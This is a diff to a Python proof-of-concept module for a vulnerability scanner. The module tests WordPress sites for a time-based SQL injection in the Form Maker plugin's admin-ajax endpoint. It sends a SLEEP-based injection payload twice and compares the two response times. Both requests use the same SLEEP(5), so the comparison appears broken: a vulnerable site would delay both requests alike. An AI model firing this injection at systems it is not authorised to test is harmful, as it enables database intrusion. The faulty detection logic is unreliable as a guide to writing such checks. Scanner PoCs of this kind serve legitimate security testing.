@@ -1,6 +1,6 @@
 
 # coding:utf-8
-
+import time
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
@@ -50,12 +50,24 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             url = self.target + \
-                '/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&amp;task=db_table_struct'
+                '/wp-admin/admin-ajax.php?action=FormMakerSQLMapping_fmc&task=db_table_struct'
+            timeout = 5
+            start_time = time.time()
+
             payload = {
-                'name': "wp_users WHERE 42=42 AND SLEEP(42)--;"
+                'name': "wp_users WHERE 42=42 AND SLEEP({})--;".format(timeout)
             }
-            response = requests.post(url, data=payload)
-            if response.status_code == 200:
+            _response = requests.post(url, data=payload)
+            
+            end_time1 = time.time()
+            
+            payload1 = {
+                'name': "wp_users WHERE 42=42 AND SLEEP(5)--;"
+            }
+            _response = requests.post(url, data=payload1)
+            end_time2 = time.time()
+
+            if  (end_time2-end_time1)-(end_time1-start_time) >= timeout:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
         except Exception as e:
